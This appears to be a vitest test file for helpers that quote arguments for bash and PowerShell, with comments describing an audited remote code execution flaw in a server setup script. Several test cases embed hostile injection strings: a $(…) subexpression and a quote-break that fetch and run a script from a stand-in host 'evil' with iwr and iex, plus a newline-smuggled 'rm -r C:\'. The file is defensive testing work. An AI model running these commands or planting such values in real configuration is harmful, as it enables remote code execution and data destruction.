import { describe, expect, it } from 'vitest';
import { escapePowerShellArg, escapeShellArg } from '../../src/common/shellQuote';

// `escapeShellArg`'s own behaviour is already pinned by test/tmux/tmuxSession.test.ts
// (it is re-exported from there); the cases below only cover what the PowerShell
// sibling must match, so the two helpers stay recognisably the same shape.
describe('escapeShellArg', () => {
    it('wraps in single quotes', () => {
        expect(escapeShellArg('/opt/server')).toBe(`'/opt/server'`);
    });
});

// PowerShell has no POSIX-style `'\''` trick: inside a single-quoted string the
// *only* special character is `'` itself, escaped by doubling it. Everything
// else — `$(…)` subexpressions, `"`, backticks, `;`, newlines — is literal.
// This is the Windows counterpart of the bash hardening: without it,
// serverSetup.ts spliced `remote.SSH.serverInstallPath` /
// `serverDownloadUrlTemplate` / `serverBinaryName` into *double*-quoted
// assignments in server-setup.ps1, where `$(…)` is evaluated — i.e. remote code
// execution at connect time.
describe('escapePowerShellArg', () => {
    it('wraps a plain value in single quotes', () => {
        expect(escapePowerShellArg('C:\\srv')).toBe(`'C:\\srv'`);
    });

    it('does not treat a backslash as an escape (unlike a double-quoted PS string)', () => {
        // `\` is not an escape character in PowerShell at all, and `` ` `` (the
        // real escape char) is inert inside single quotes — so the value must
        // pass through byte-for-byte.
        expect(escapePowerShellArg('C:\\a`n\\b')).toBe('\'C:\\a`n\\b\'');
    });

    it('doubles an embedded single quote', () => {
        expect(escapePowerShellArg(`C:\\it's here`)).toBe(`'C:\\it''s here'`);
    });

    it('doubles every embedded single quote, not just the first', () => {
        expect(escapePowerShellArg(`a'b'c`)).toBe(`'a''b''c'`);
    });

    it('neutralises a `$(…)` subexpression injection', () => {
        // Proof-of-concept from the audit: this value in
        // `remote.SSH.serverInstallPath` executed `iwr` on the remote when it
        // landed inside `$SERVER_DATA_DIR="…"`.
        const hostile = 'C:\\srv$(iwr http://evil/x.ps1 -OutFile $env:TEMP\\x.ps1; & $env:TEMP\\x.ps1)';
        expect(escapePowerShellArg(hostile)).toBe(`'${hostile}'`);
    });

    it('neutralises a quote-break injection', () => {
        // The other half of the same hazard: a `"` closing the double-quoted
        // assignment and appending a statement.
        const hostile = 'C:\\srv"; iwr http://evil/x.ps1 | iex; "';
        expect(escapePowerShellArg(hostile)).toBe(`'${hostile}'`);
    });

    it('keeps a newline inert instead of starting a new statement', () => {
        expect(escapePowerShellArg('a\nrm -r C:\\')).toBe(`'a\nrm -r C:\\'`);
    });
});
